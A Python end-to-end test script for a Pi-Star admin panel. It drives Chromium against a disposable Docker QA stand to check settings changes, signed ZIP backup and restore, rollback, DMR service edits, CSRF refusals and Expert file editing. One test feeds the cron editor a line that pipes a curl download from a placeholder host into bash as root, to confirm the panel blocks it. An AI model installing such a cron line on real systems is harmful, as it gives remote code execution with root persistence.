#!/usr/bin/env python3
"""Exercise real settings and signed archive transactions on a disposable QA stand."""

import argparse
from hashlib import sha256
from ipaddress import ip_address
import json
from pathlib import Path
import re
import subprocess
import sys
from tempfile import TemporaryDirectory
from urllib.parse import quote, urlsplit
from zipfile import BadZipFile, ZipFile

from admin_e2e import Admin, cdp
from fixtures.chromium_https import chromium
from full_ui import ELEMENT, equal, tid
from smoke import wait


NAMES = ("MMDVM-Host.ini", "DMRGateway.ini")
INITIAL = {"callsign": "DEMO1", "master": "192.0.2.11"}
CHANGED = {"callsign": "DEMO2", "master": "192.0.2.12"}
RESTARTS = ["dmrgateway.service ok", "mmdvmhost.service ok"]
FAILED_AND_RECOVERED = ["dmrgateway.service ok", "mmdvmhost.service fail", *RESTARTS]
EVENTS = "/run/pistar-qa/events"
FAULT = "/run/pistar-qa/fail-next-mmdvmhost"
STATE = "/var/lib/pistar-panel-config/"
ARCHIVE = tid("station-backup")
CHOOSE = ARCHIVE + " input[type=file]"


def loopback_origin(value):
    try:
        u = urlsplit(value)
        if (not re.fullmatch(r"https://(?:localhost|[0-9.]+|\[[0-9a-fA-F:]+\]):[0-9]+/?", value)
                or not u.port or (u.hostname != "localhost" and not ip_address(u.hostname).is_loopback)):
            raise ValueError
        host = f"[{u.hostname}]" if ":" in u.hostname else u.hostname
        return f"https://{host}" + (f":{u.port}" if u.port != 443 else "")
    except ValueError:
        raise argparse.ArgumentTypeError("expected a loopback HTTPS origin with an explicit port") from None


def stand_name(value):
    if not re.fullmatch(r"pstar-write-qa-[a-z0-9]+", value):
        raise argparse.ArgumentTypeError("expected pstar-write-qa-[a-z0-9]+")
    return value


def same_pair(stage, actual, expected):
    equal(stage + " file count", len(actual), len(NAMES))
    for name, got, want in zip(NAMES, actual, expected):
        if got != want:
            raise AssertionError(f"{stage}: {name} expected SHA256 {sha256(want).hexdigest()}, "
                                 f"got {sha256(got).hexdigest()}")


def changed_pair(originals):
    # Construct the oracle from just the two fixture lines. Preserve all other
    # bytes, including comments, private fields, line endings and final newline.
    result = []
    for data, key, field in zip(originals, (b"Callsign", b"Address"), INITIAL):
        old = key + b"=" + INITIAL[field].encode()
        new = key + b"=" + CHANGED[field].encode()
        equal(f"dummy fixture line {key.decode()}", data.splitlines().count(old), 1)
        equal(f"unique {key.decode()} replacement", data.count(old), 1)
        result.append(data.replace(old, new))
    return tuple(result)


class Stand:
    def __init__(self, name):
        self.name = stand_name(name)

    def exec(self, *args, check=True):
        return subprocess.run(["docker", "exec", "--user", "0", self.name, *args], check=check,
                              stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, timeout=15)

    def read(self, path):
        return self.exec("cat", path).stdout

    def exists(self, path):
        result = self.exec("test", "-e", path, check=False)
        if result.returncode == 1:
            return False
        result.check_returncode()
        return True

    def pair(self):
        return tuple(self.read("/etc/" + name) for name in NAMES)

    def restarts(self):
        return self.read(EVENTS).decode().splitlines() if self.exists(EVENTS) else []

    def check_state(self, stage, live, previous, restarts):
        same_pair(stage, self.pair(), live)
        equal(stage + " restart history", self.restarts(), restarts)
        equal(stage + " unconsumed fault", self.exists(FAULT), False)
        equal(stage + " pending recovery", self.exists(STATE + "pending.json"), False)
        snapshot = self.read(STATE + "previous.json")
        same_pair(stage + " rollback snapshot", [s.encode() for s in json.loads(snapshot)], previous)
        return snapshot


def backup_page(v):
    v.nav("backup")
    wait("archive session not ready", lambda: v.field(CHOOSE + ":enabled"))


def download(v, folder, expected):
    path = folder / "Pi-Star-PRIVATE.zip"
    if path.exists():
        raise AssertionError("archive download destination already exists")
    v.click(ARCHIVE + " a[download]")
    wait("PRIVATE ZIP download missing", path.is_file)
    with ZipFile(path) as z:
        equal("PRIVATE ZIP members", z.namelist(), list(NAMES))
        equal("PRIVATE ZIP signature envelope",
              bool(re.fullmatch(rb"Pi-Star PRIVATE archive v1 \| [0-9a-f]{64}", z.comment)), True)
        same_pair("downloaded ZIP", [z.read(name) for name in NAMES], expected)
    return path


def archive_button(v, label):
    el = v.js("return button(arguments[0])", label)
    if not el:
        raise AssertionError(f"missing archive button: {label}")
    v.command(f"/element/{el[ELEMENT]}/click", {})


def archive_notice(v, role, fragment):
    wait("expected archive " + role + ": " + fragment, lambda: fragment in v.js(
        "return text(document.querySelector(arguments[0]))", ARCHIVE + f' [role="{role}"]'))


def preview(v, path, changed):
    v.choose_file(CHOOSE, path)
    archive_button(v, "Проверить архив")
    archive_notice(v, "status", "Архив проверен")
    label = "будет заменён" if changed else "без изменений"
    equal("archive preview rows", v.js("return all(arguments[0]).map(text)", ARCHIVE + " li"),
          [f"{name} — {label}" for name in NAMES])
    equal("restore confirmation offered", v.js("return !!button('Подтвердить восстановление')"), changed)


def apply_settings(v, fail=False):
    v.nav("settings")
    v.ready(INITIAL)
    for field, value in CHANGED.items():
        v.type_into(tid("settings-" + field), value)
    v.settings("apply")
    if fail:
        v.notice("error", "Мастер не выполнил операцию")
    else:
        v.notice("status", "применены и перечитаны")
        v.ready(CHANGED)


def exercise(v, stand, folder, original, changed):
    history = stand.restarts()
    v.ready(INITIAL)
    backup_page(v)
    first = download(v, folder, original).rename(folder / "original.zip")
    preview(v, first, changed=False)

    apply_settings(v)
    history += RESTARTS
    stand.check_state("settings applied", changed, original, history)
    print("PASS on-disk settings: Callsign=DEMO1 -> DEMO2; master Address=192.0.2.11 -> 192.0.2.12; "
          "all other bytes unchanged; applied SHA256: " +
          ", ".join(f"{name} {sha256(data).hexdigest()}" for name,data in zip(NAMES,changed)), flush=True)
    backup_page(v)
    second = download(v, folder, changed)
    preview(v, first, changed=True)
    stand.check_state("restore preview", changed, original, history)
    archive_button(v, "Подтвердить восстановление")
    archive_notice(v, "status", "Файлы восстановлены")
    history += RESTARTS
    snapshot = stand.check_state("archive restored", original, changed, history)
    print("PASS settings apply and signed archive restore; original SHA256: " +
          ", ".join(f"{n} {sha256(b).hexdigest()}" for n, b in zip(NAMES, original)), flush=True)

    stand.exec("touch", FAULT)
    apply_settings(v, fail=True)
    history += FAILED_AND_RECOVERED
    after = stand.check_state("failed settings apply", original, changed, history)
    equal("failed settings apply preserved previous.json bytes", after == snapshot, True)

    backup_page(v)
    preview(v, second, changed=True)
    stand.check_state("failed-restore preview", original, changed, history)
    stand.exec("touch", FAULT)
    archive_button(v, "Подтвердить восстановление")
    archive_notice(v, "alert", "Операция не выполнена")
    history += FAILED_AND_RECOVERED
    after = stand.check_state("failed archive restore", original, changed, history)
    equal("failed restore preserved previous.json bytes", after == snapshot, True)
    preview(v, first, changed=False)
    v.nav("settings")
    v.ready(INITIAL)
    print("PASS injected settings and archive failures: both files, rollback snapshot, "
          "pending state, service recovery order and UI reread", flush=True)

    apply_settings(v)
    history += RESTARTS
    stand.check_state("before manual rollback", changed, original, history)
    v.settings("rollback")
    same_pair("opening confirmation did not write", stand.pair(), changed)
    equal("opening confirmation did not restart services", stand.restarts(), history)
    v.settings("confirm-rollback")
    v.notice("status", "настройки восстановлены и перечитаны")
    v.ready(INITIAL)
    same_pair("operator rollback", stand.pair(), original)
    equal("operator rollback consumed snapshot", stand.exists(STATE + "previous.json"), False)
    equal("operator rollback left no pending transaction", stand.exists(STATE + "pending.json"), False)
    equal("operator rollback restart order", stand.restarts(), history + RESTARTS)
    print("PASS confirmed operator rollback: both original files byte-identical, previous.json consumed", flush=True)


def exercise_services(v, stand, original):
    v.nav("services")
    cc, rule = 'input[name=cc]', 'input[name=rule0]'
    def loaded():
        alert = v.js("return document.querySelector('[role=alert]')?.innerText")
        if alert:
            raise AssertionError("DMR editor: " + alert)
        return v.field(rule)
    wait("DMR controls did not load", loaded)
    api = '/manage/api/services'
    def request(js, *args):
        return v.command('/execute/async', {'script':js,'args':list(args)})
    old = request("fetch(arguments[0]).then(r=>r.json()).then(arguments[arguments.length-1])",api)
    def post(body, token):
        return request("""const [url,body,csrf,done]=arguments;
          fetch(url,{method:'POST',headers:{'Content-Type':'application/json','X-PiStar-CSRF':csrf},
          body:JSON.stringify(body)}).then(r=>done(r.status))""",api,body,token)
    history = stand.restarts()
    equal("missing CSRF",post(old['config'],''),403)
    equal("invalid TG slot",post(dict(old['config'],rules=['0,1,2,1,1',*old['config']['rules'][1:]]),old['csrf']),422)
    same_pair("rejected submissions",stand.pair(),original)
    equal("rejected submissions: no restarts",stand.restarts(),history)
    expected = (original[0].replace(b'ColorCode=1\n',b'ColorCode=7\n'),
                original[1].replace(b'TGRewrite0=2,91,2,91,1\n',b'TGRewrite0=2,91,2,310,1\n'))
    assert all(a!=b for a,b in zip(original,expected))
    v.type_into(cc,'7')
    v.type_into(rule,'2,91,2,310,1')
    v.click('form button')
    wait("save not acknowledged",lambda:v.js("return document.querySelector('[role=status]')?.innerText.includes('сохранены')"))
    history += RESTARTS
    stand.check_state("DMR saved",expected,original,history)
    equal("stale revision",post(old['config'],old['csrf']),409)
    stand.check_state("stale DMR form",expected,original,history)
    v.nav('settings')
    v.nav('services')
    wait("DMR readback",lambda:v.js("return document.querySelector('[name=cc]')?.value==='7' && document.querySelector('[name=rule0]')?.value==='2,91,2,310,1'"))
    v.nav('settings')
    v.ready(INITIAL)
    v.settings("rollback")
    v.settings("confirm-rollback")
    v.notice("status","настройки восстановлены и перечитаны")
    same_pair("DMR rollback",stand.pair(),original)
    equal("DMR rollback restart order",stand.restarts(),history+RESTARTS)
    assert not stand.exists(STATE+'previous.json')
    print("PASS Chromium DMR services: ColorCode 1 -> 7, TGRewrite0 destination 91 -> 310; "
          "fresh GET, exact two-INI comparison, confirmed rollback; CSRF 403, invalid rule 422, stale 409, no extra restarts",flush=True)


def exercise_expert(v, stand, origin, original):
    """Expert Quick Edit and Full Edit through Chromium against the real helper."""
    host, gw = original

    def go(fragment, ready):
        v.command("/url", {"url": origin + "/manage/#expert"})
        v.command("/url", {"url": origin + "/manage/#" + fragment})
        wait(fragment + " did not load", lambda: v.js(ready))

    def post(api, body, csrf):
        return v.command('/execute/async', {'script': """const [url,body,csrf,done]=arguments;
          fetch(url,{method:'POST',headers:{'Content-Type':'application/json','X-PiStar-CSRF':csrf},
          body:JSON.stringify(body)}).then(r=>done(r.status))""", 'args': [api, body, csrf]})

    cc = 'input[aria-label="DMR ColorCode"]'
    go("expert-mmdvmhost", f"return document.querySelector('{cc}')?.value === '1'")
    history = stand.restarts()
    # 1. change one value
    v.type_into(cc, "5")
    v.click('form input[type=submit]')
    wait("Quick Edit save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
    host5 = host.replace(b"ColorCode=1\n", b"ColorCode=5\n")
    assert host5 != host
    same_pair("Quick Edit ColorCode 1 -> 5", stand.pair(), (host5, gw))
    history += ["mmdvmhost.service ok"]
    equal("Quick Edit restarts", stand.restarts(), history)
    # 2. reopen shows the stored value
    go("expert-mmdvmhost", f"return document.querySelector('{cc}')?.value === '5'")
    # 3. unchanged form writes nothing and restarts nothing
    v.click('form input[type=submit]')
    wait("no-op save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
    same_pair("Quick Edit no-op save", stand.pair(), (host5, gw))
    equal("Quick Edit no-op restarts", stand.restarts(), history)
    # 4. stale form: the file changes underneath the open page
    go("expert-mmdvmhost", f"return document.querySelector('{cc}')?.value === '5'")
    stand.exec("sed", "-i", "s/^ColorCode=5$/ColorCode=6/", "/etc/MMDVM-Host.ini")
    host6 = host.replace(b"ColorCode=1\n", b"ColorCode=6\n")
    v.type_into(cc, "7")
    v.click('form input[type=submit]')
    wait("stale save not refused", lambda: v.js("return document.body.innerText.includes('changed since this page was loaded')"))
    same_pair("Quick Edit stale form", stand.pair(), (host6, gw))
    equal("Quick Edit stale restarts", stand.restarts(), history)
    # 5. missing CSRF header
    state = v.command('/execute/async', {'script': "fetch(arguments[0]).then(r=>r.json()).then(arguments[arguments.length-1])",
                                         'args': ["/manage/api/expert/mmdvmhost"]})
    equal("Quick Edit without CSRF", post("/manage/api/expert/mmdvmhost", {"revision": state["revision"], "values": {"DMR": {"ColorCode": "9"}}}, ""), 403)
    same_pair("Quick Edit CSRF refusal", stand.pair(), (host6, gw))
    # 6. Full Edit DMRGateway: whole file, restarts MMDVMHost then DMRGateway
    go("expert-full-dmrgateway", "return document.querySelector('textarea')?.value.includes('[General]')")
    new_gw = gw.decode().replace("[General]", "# edited in Full Edit\n[General]", 1)
    v.js("const t=document.querySelector('textarea'); t.value=arguments[0]; t.dispatchEvent(new Event('input',{bubbles:true}))", new_gw)
    v.click('form input[type=submit]')
    wait("Full Edit save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
    same_pair("Full Edit DMRGateway", stand.pair(), (host6, new_gw.encode()))
    history += ["mmdvmhost.service ok", "dmrgateway.service ok"]
    equal("Full Edit restarts", stand.restarts(), history)
    equal("Full Edit DMRGateway mode", stand.exec("stat", "-c", "%U:%G %a", "/etc/DMRGateway.ini").stdout.decode().strip(), "mmdvm:mmdvm 600")
    # 7. System Cron refuses blocked patterns without touching the file
    cron_before = stand.read("/etc/crontab") if stand.exists("/etc/crontab") else None
    go("expert-full-cron", "return !!document.querySelector('textarea')")
    v.js("const t=document.querySelector('textarea'); t.value=arguments[0]; t.dispatchEvent(new Event('input',{bubbles:true}))",
         "*/5 * * * * root curl http://example.invalid/x | bash\n")
    v.click('form input[type=submit]')
    wait("blocked cron line not reported", lambda: v.js("return document.body.innerText.includes('pipes downloaded content directly into a shell')"))
    equal("System Cron unchanged", stand.read("/etc/crontab") if stand.exists("/etc/crontab") else None, cron_before)
    equal("System Cron restarts", stand.restarts(), history)
    print("PASS Chromium Expert: Quick Edit ColorCode 1 -> 5 with exact file comparison and one MMDVMHost restart, "
          "reopen shows 5, unchanged form writes nothing, stale form 409 keeps the newer file, missing CSRF 403; "
          "Full Edit DMRGateway writes the whole text, keeps mmdvm:mmdvm 600 and restarts MMDVMHost then DMRGateway; "
          "System Cron refuses a blocked pattern without writing", flush=True)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--origin", type=loopback_origin, required=True)
    parser.add_argument("--services", action="store_true")
    parser.add_argument("--expert", action="store_true")
    parser.add_argument("--key", type=Path, required=True)
    parser.add_argument("--work", type=Path, required=True)
    parser.add_argument("--container", type=stand_name, required=True)
    args = parser.parse_args()
    stand = Stand(args.container)
    original = stand.pair()
    changed = changed_pair(original)
    password = (args.work / "admin-password").read_text().rstrip("\r\n")
    if not password:
        raise ValueError("empty stand admin-password")
    # Snap Chromium's private /tmp cannot see the coordinator's work directory.
    shared = Path.home() / "snap/chromium/common"
    shared.mkdir(parents=True, exist_ok=True)
    # TemporaryDirectory creates a mode-0700 directory for both download and upload.
    with TemporaryDirectory(prefix="write-browser-", dir=shared) as folder:
        with chromium(args.origin, args.key) as command:
            auth = args.origin.replace("://", f"://pi-star:{quote(password, safe='')}@", 1)
            command("/url", {"url": auth + "/manage/"})
            cdp(command, "Browser.setDownloadBehavior", behavior="allow", downloadPath=folder)
            v = Admin(command, args.origin + "/manage/", 1280, 900, False)
            # /manage/ is the classic admin page; the station settings, DMR
            # services and backup pages live under their own sections.
            if not args.expert:
                command("/url", {"url": args.origin + "/manage/#settings"})
                wait("workspace menu did not load", lambda: v.js("return !!document.querySelector('nav a[href=\"#services\"]')"))
            if args.expert:
                exercise_expert(v, stand, args.origin, original)
            elif args.services:
                exercise_services(v, stand, original)
            else:
                exercise(v, stand, Path(folder), original, changed)


if __name__ == "__main__":
    try:
        main()
    except (AssertionError, BadZipFile, OSError, RuntimeError, ValueError, subprocess.SubprocessError) as exc:
        sys.exit(f"FAIL: {exc}")
